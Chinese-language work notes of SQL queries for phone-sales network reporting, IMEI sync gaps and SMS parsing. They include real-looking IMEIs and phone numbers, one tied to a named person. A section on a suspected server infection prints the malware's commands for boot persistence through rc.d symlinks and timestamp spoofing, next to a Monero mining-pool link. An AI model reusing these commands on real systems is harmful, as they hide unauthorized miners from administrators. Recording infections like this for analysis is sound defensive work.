
### 内销网络回传率统计：
#### 机型统计总销量，sql语句
  - 按机型统计总销量，网络回传数据，网络回传延时的情况：
```
SELECT
    SUBSTR(SUBSTRING_INDEX(softwareVersion, '_', 1), 4 ) as modem
    ,count(*) as total
    , sum( if (upBynetwork=1 , 1 ,0) ) as network
    , sum( if (upBynetwork=1 , 1 ,0) ) / count(*) as 'net/persent'

    , sum( if (datediff(UPDATEtime , createtime)>7 , 1 ,0) ) as day7
    , sum( if (datediff(UPDATEtime , createtime)>30 , 1 ,0) ) as day30
    , sum( if (datediff(UPDATEtime , createtime)>100 , 1 ,0) ) as day100

    , sum( if (datediff(UPDATEtime , createtime)>7 , 1 ,0) )/sum( if (upBynetwork=1 , 1 ,0) )  as 'day7/persent'
    , sum( if (datediff(UPDATEtime , createtime)>30 , 1 ,0) )/sum( if (upBynetwork=1 , 1 ,0) )  as 'day30/persent'
    , sum( if (datediff(UPDATEtime , createtime)>100 , 1 ,0) )/sum( if (upBynetwork=1 , 1 ,0) )  as 'day100/persent'

FROM `electroniccard`
WHERE SUBSTR(SUBSTRING_INDEX(softwareVersion, '_', 1), 4 ) in ('E2','S3' )
group by modem
order by total desc
```

### 统计 E2
#### 总体情况统计sql
```
SELECT
'2017-04-20' as 'start_time'
, SUBSTR(SUBSTRING_INDEX(softwareVersion, '_', 1), 4 ) as modem
,count(*) as total
, sum( if (upBynetwork=1 , 1 ,0) ) as ByNetwork
, sum( if (upBynetwork=1 , 1 ,0) ) / count(*) as 'net/persent'

, sum( if (datediff(updatetime , createtime)>7 , 1 ,0) ) as day7
, sum( if (datediff(updatetime , createtime)>30 , 1 ,0) ) as day30
, sum( if (datediff(updatetime , createtime)>100 , 1 ,0) ) as day100

, sum( if (datediff(updatetime , createtime)>7 , 1 ,0) )/sum( if (upBynetwork=1 , 1 ,0) )  as 'day7/persent'
, sum( if (datediff(updatetime , createtime)>30 , 1 ,0) )/sum( if (upBynetwork=1 , 1 ,0) )  as 'day30/persent'
, sum( if (datediff(updatetime , createtime)>100 , 1 ,0) )/sum( if (upBynetwork=1 , 1 ,0) )  as 'day100/persent'

FROM `electroniccard`
WHERE SUBSTR(SUBSTRING_INDEX(softwareVersion, '_', 1), 4 ) in ('E2')
  and upbynetwork=1 and createtime > timestamp('2017-04-20')
group by modem


### 按照机型，查询
SELECT
  createtime, updatetime , ncreatetime, nupdatetime
  , softwareVersion , upBynetwork
FROM `electroniccard`
WHERE
  SUBSTR(SUBSTRING_INDEX(softwareVersion, '_', 1), 4 ) in ('S5') and createtime > timestamp('2017-04-20')
ORDER BY `card_id` DESC
```

#### 创建 e2_sale表
```
CREATE TABLE `e2_sale` (
  `id` int(11) NOT NULL AUTO_INCREMENT,
  `modem` varchar(16) CHARACTER SET utf8mb4 DEFAULT NULL,
  `phoneNumber` varchar(16) CHARACTER SET utf8mb4 DEFAULT NULL COMMENT '电话号码（卡1）',
  `imei` varchar(20) CHARACTER SET utf8mb4 DEFAULT NULL COMMENT 'imei号',
  `delay` int(7) DEFAULT NULL,
  `createtime` datetime DEFAULT NULL COMMENT '创建时间',
  `updatetime` datetime DEFAULT NULL ,
  `merge` int(7) DEFAULT 0,
  `app_stime` datetime DEFAULT NULL ,
  `app_etime` datetime DEFAULT NULL ,
  `net_num` int DEFAULT NULL,
  `note_num` int DEFAULT NULL,
  PRIMARY KEY (`id`),
  UNIQUE KEY `uk_imei` (`imei`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8
```

#### e2_sale表，销量数据插入
```
insert into e2_sale (modem,phoneNumber,imei, delay,createtime,updatetime )
(
	SELECT SUBSTR(SUBSTRING_INDEX(softwareVersion, '_', 1), 4 ) as modem
	 , phoneNumber  ,imei, datediff(UPDATEtime , createtime) as delay
	 , createtime, updatetime
	 from electroniccard
	where SUBSTR(SUBSTRING_INDEX(softwareVersion, '_', 1), 4 ) in ('E2') and upbynetwork=1 and createtime > timestamp('2017-04-20')
)
```

#### 查询 appinfo 表
- ##### 需要把 appinfo 表中的时间信息复制到 e2_sale 表中，方便做统计。
- 数据太大，用下面语句插入非常慢：
```
create table e2_app
select imei , min(createtime) as apptime from  appinfo
where imei in
( select imei from e2_sale where id<100 )
group by imei
```

- 单条数据插入方式，使用 python 脚本
```
select imei , min(createtime) as app_stime , max(createtime) as app_etime,
 count(distinct(DATE_FORMAT(createTime,'%Y.%m.%d'))) net_num ,
 count(*) as note_num
from  appinfo where imei='864307030350916';
+-----------------+---------------------+---------------------+---------+----------+
| imei            | app_stime           | app_etime           | net_num | note_num |
+-----------------+---------------------+---------------------+---------+----------+
| 864307030350916 | 2017-04-25 08:05:27 | 2017-09-21 13:12:16 |       6 |      172 |
+-----------------+---------------------+---------------------+---------+----------+
1 row in set (0.00 sec)
```

#### python 脚本编写

- 按日期统计E2销量
```
select count(*) , DATE_FORMAT(createTime,'%Y.%m.%d') from e2_sale group by DATE_FORMAT(createTime,'%Y.%m.%d')
```
- 按日期统计E2没有信息采集的数量
```
select count(*) , DATE_FORMAT(createTime,'%Y.%m.%d') from e2_sale where net_num is null group by DATE_FORMAT(createTime,'%Y.%m.%d') ;
```

#### sqlserver 语法：
- 查询
```
# 查询1
select top 5 * from KKIMEI.dbo.t_mo_imei where substring(S_softwareVersion, 1, 6)='KAAE2_' ;
# 查询2
select top 5 * from KKIMEI.dbo.t_mo_imei where S_SMSCDateTime>dateadd(day,0,'2017-4-20') ;
# 查询3 查询详细信息，特定时段，特定卡号
select top 150
I_ID, I_ReceiveID, S_SendMobileNumber, S_SMSCNumber, S_IMEI, S_HardwareVersion, S_SMSCDateTime
 from KKIMEI.dbo.t_mo_imei
 where S_SMSCDateTime>dateadd(day,0,'2017-11-08 13:00:00')
 and S_SMSCDateTime<dateadd(day,0,'2017-11-08 14:00:00')
 and I_ReceiveID=1
 ;
 # 查询4 统计查询4个卡的数据量
 select  '2017-11-04 13:00:00' AS '开始' , '2017-11-08 13:00:00' AS '截止'
	, I_ReceiveID AS 卡序号
	, count(*) AS 短信总数
	, sum(case when S_IMEI='' then 0 else 1 end) AS 正确解析
	, ROUND( CAST(sum(case when S_IMEI='' then 0 else 1 end) AS FLOAT) / count(*) , 2 )*100 AS 正确率
 from KKIMEI.dbo.t_mo_imei
 where S_SMSCDateTime>dateadd(day,0,'2017-11-04 13:00:00')
 and S_SMSCDateTime<dateadd(day,0,'2017-11-08 13:00:00')
 group by I_ReceiveID
 ;
 # 查询5 imei 模糊查询短信内容 863724033905654
 select *
from KKIMEI.dbo.t_mo_imei
where S_SMSCDateTime>dateadd(day,0,'2017-11-08 13:00:00')
and S_SMSContent like '%863724033%565475%'
# and S_IMEI='863724033565475'

# 查询6 按照机型查询短信数量
 select
'510' AS 机型 , count(*) AS 总短信数量
, sum(case when S_IMEI='' then 0 else 1 end) AS 正确短信
, CONVERT(varchar(10),S_SMSCDateTime, 23) as 日期
from KKIMEI.dbo.t_mo_imei
where S_SMSCDateTime>dateadd(day,0,'2017-11-03 00:00:00')
and S_SMSContent like '%KAA510%'
group by CONVERT(varchar(10),S_SMSCDateTime, 23)

# 新建表，插入数据
select top 5
I_ID , S_IMEI, S_SendMobileNumber,S_SMSCNumber , S_SMSCDateTime, D_UpdateTime, S_softwareVersion
from KKIMEI.dbo.t_mo_imei where S_SMSCDateTime>dateadd(day,0,'2017-4-20') ;

### 原始建表语句
CREATE TABLE [t_mo_imei] (
	[I_ID] [int] IDENTITY (1, 1) NOT NULL ,
	[I_ReceiveID] [tinyint] NOT NULL CONSTRAINT [DF_t_mo_imei_I_ReceiveID] DEFAULT (0),
	[S_SendMobileNumber] [varchar] (20) COLLATE Chinese_PRC_CI_AS NOT NULL CONSTRAINT [DF_t_mo_imei_S_SendMobileNumber] DEFAULT (''),
	[S_SMSContent] [varchar] (512) COLLATE Chinese_PRC_CI_AS NOT NULL ,
	[S_SMSCDateTime] [datetime] NOT NULL CONSTRAINT [DF_t_mo_imei_S_SMSCDateTime] DEFAULT (getdate()),
	[S_IMEI] [varchar] (64) COLLATE Chinese_PRC_CI_AS NOT NULL CONSTRAINT [DF_t_mo_imei_S_IMEI] DEFAULT (''),
	[S_SMSCNumber] [varchar] (20) COLLATE Chinese_PRC_CI_AS NOT NULL CONSTRAINT [DF_t_mo_imei_S_SMSCNumber] DEFAULT (''),
	[S_C] [varchar] (50) COLLATE Chinese_PRC_CI_AS NOT NULL CONSTRAINT [DF_t_mo_imei_S_C] DEFAULT (''),
	[S_HardwareVersion] [varchar] (64) COLLATE Chinese_PRC_CI_AS NOT NULL CONSTRAINT [DF_t_mo_imei_S_HardwareVersion] DEFAULT (''),
	[S_softwareVersion] [varchar] (64) COLLATE Chinese_PRC_CI_AS NOT NULL CONSTRAINT [DF_t_mo_imei_S_softwareVersion] DEFAULT (''),
	[S_LAI] [varchar] (64) COLLATE Chinese_PRC_CI_AS NOT NULL CONSTRAINT [DF_t_mo_imei_S_LAI] DEFAULT (''),
	[S_ErrMsg] [varchar] (1024) COLLATE Chinese_PRC_CI_AS NOT NULL CONSTRAINT [DF_t_mo_imei_S_ErrMsg] DEFAULT (''),
	[S_SourceContent] [varchar] (512) COLLATE Chinese_PRC_CI_AS NOT NULL CONSTRAINT [DF_t_mo_imei_S_SourceContent] DEFAULT (''),
	[I_Status] [int] NOT NULL CONSTRAINT [DF_t_mo_imei_I_Status] DEFAULT (0),
	[D_UpdateTime] [datetime] NOT NULL CONSTRAINT [DF_t_mo_imei_D_UpdateTime] DEFAULT (getdate()),
	CONSTRAINT [PK_t_mo_imei] PRIMARY KEY  CLUSTERED
	(
		[I_ID]
	)  ON [PRIMARY]
) ON [PRIMARY]
GO
```
#### 杨乐辉测试号码： 13925279062 ，可以分析短信错误的类型。

### 2017-11-08 3台测试机器：
- "351374201711078","351376201711073","351372201711072"
#### 网络回传都收到：
```
mysql> select phoneNumber,imei,ncreatetime,nupdatetime,softwareVersion from electroniccard where imei in ("351374201711078","351376201711073","351372201711072") ;
+-------------+-----------------+---------------------+---------------------+--------------------------+
| phoneNumber | imei            | ncreatetime         | nupdatetime         | softwareVersion          |
+-------------+-----------------+---------------------+---------------------+--------------------------+
| NULL        | 351372201711072 | 2017-11-07 21:01:30 | 2017-11-07 21:01:30 | KAA711_1.18.B06-imeiback |
| NULL        | 351374201711078 | 2017-11-07 21:00:16 | 2017-11-07 21:00:16 | KAA711_1.18.B06-imeiback |
| NULL        | 351376201711073 | 2017-11-07 21:02:52 | 2017-11-07 21:02:52 | KAA711_1.18.B06-imeiback |
+-------------+-----------------+---------------------+---------------------+--------------------------+
```
```
3个IMEI都没有查询到短信数据： (可能是 校验码错误导致解析数据失败)
短信样本分析：
正确短信：Imei:860639030105054; SendMobileNumber:18294728748; hardwareversion:L205_V1.3; softwareversion:KAHD1_CH_ALI_1.00.422
898988888986063903090105054Z+90861380093915ZL5205_V1.3ZKAHD1_>H_ALI_1.00.422Z460_2_168925697_37836ZC0123456789012345678901234567890123456706

校验码错误!正确值 43  SendMobileNumber:13710356335;
898988888986683502990880038Z+90891380020015005ZL203_V1ZKAHD557_>H_ALI_1.06.622Z460_65535_44114000_02271ZC56789012345678901234567890123456744
```

### 短信同步进程问题分析：
#### 问题统计
  - 34807条  同步了 31677条   9%没同步
#### Sqlserver 数据
  - 查询某段时间内，某机型在短信接受情况。
```
select
I_ID, I_ReceiveID, S_SendMobileNumber, S_SMSCNumber, S_IMEI, S_HardwareVersion, S_SMSCDateTime
from KKIMEI.dbo.t_mo_imei
where S_SMSCDateTime>dateadd(day,0,'2017-11-03 23:42:00') and S_SMSCDateTime<dateadd(day,0,'2017-11-10 15:42:00')
and S_SMSContent like '%KAAS2%'
```

#### 内销数据库查询
  - 查询某段时间内，某机型的同步情况。
```
SELECT
imei
FROM `electroniccard`
WHERE createtime > timestamp('2017-11-1')
   and  imei in (
"861814038391753",
"861814038300218",
"861814039984879",
"861814039980034",
"99000635830433",
"861814038284891",
"861814039985538",
"861814038339778",
"861814038313856",
"861814038355238",
"861814038320554",
"861814039984853",
"99000635829195",
"99000635829611",
"861814039985777",
"861814038276434",
"861814039981776",
"861814038292795"
)
```

#### 丢失数据
  - 没有同步到内销数据库的IMEI。
```
"861814039984879",
"861814038284891",
"861814038313856",
"861814038355238",
```

#### 怀疑病毒
- cd /home/liuyang/product/apache-tomcat-8.5.12/webapps/Apache-tomcat/
- 样本备份到 D:\work\2017\x项目汇总\244迁移\244_qlin
- wipefs qlin

http://www.cnblogs.com/liuchuyu/p/7490338.html
```
/home/liuyang/product/apache-tomcat-8.5.12/webapps/Apache-tomcat/

/bin/wipefs

cp -f  %s /bin/wipefs>/dev/null 2>&1
ln -fs /bin/wipefs /etc/init.d/wipefs>/dev/null 2>&1
ln -fs /etc/init.d/wipefs /etc/rc0.d/S01wipefs>/dev/null 2>&1
ln -fs /etc/init.d/wipefs /etc/rc1.d/S01wipefs>/dev/null 2>&1
ln -fs /etc/init.d/wipefs /etc/rc2.d/S01wipefs>/dev/null 2>&1
ln -fs /etc/init.d/wipefs /etc/rc3.d/S01wipefs>/dev/null 2>&1
ln -fs /etc/init.d/wipefs /etc/rc4.d/S01wipefs>/dev/null 2>&1
ln -fs /etc/init.d/wipefs /etc/rc5.d/S01wipefs>/dev/null 2>&1
ln -fs /etc/init.d/wipefs /etc/rc6.d/S01wipefs>/dev/null 2>&1
ln -fs /etc/init.d/wipefs /etc/rc.d/rc0.d/S01wipefs>/dev/null 2>&1
ln -fs /etc/init.d/wipefs /etc/rc.d/rc1.d/S01wipefs>/dev/null 2>&1
ln -fs /etc/init.d/wipefs /etc/rc.d/rc2.d/S01wipefs>/dev/null 2>&1
ln -fs /etc/init.d/wipefs /etc/rc.d/rc3.d/S01wipefs>/dev/null 2>&1
ln -fs /etc/init.d/wipefs /etc/rc.d/rc4.d/S01wipefs>/dev/null 2>&1
ln -fs /etc/init.d/wipefs /etc/rc.d/rc5.d/S01wipefs>/dev/null 2>&1
ln -fs /etc/init.d/wipefs /etc/rc.d/rc6.d/S01wipefs>/dev/null 2>&1
touch -r /bin/sh /bin/wipefs /etc/init.d/wipefs /etc/rc.d/rc*.d/S01wipefs>/dev/null 2>&1

http://minexmr.com/#getting_started
```

#### 按日期小时，统计销量
```
SELECT DATE_FORMAT(createTime,'%Y.%m.%d-%H') as ttt
, count(*)
FROM electroniccard
where createtime > timestamp('2017-12-30')
group by ttt
```
